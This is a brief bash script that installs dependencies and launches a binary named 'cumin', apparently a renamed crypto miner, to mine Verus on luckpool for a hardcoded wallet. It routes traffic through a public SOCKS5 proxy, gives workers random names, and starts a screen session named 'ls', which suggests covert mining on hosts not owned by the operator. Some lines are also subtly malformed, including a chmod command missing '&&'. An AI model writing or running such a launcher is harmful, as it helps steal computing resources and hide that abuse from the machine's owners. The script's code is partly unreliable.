#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x kokoh.sh && chmod +x cumin chmod 777 cumin kokoh.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
WORKER=$(echo $(shuf -i 1-10 -n 1)PION)
PROXY=socks5://72.210.252.137:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
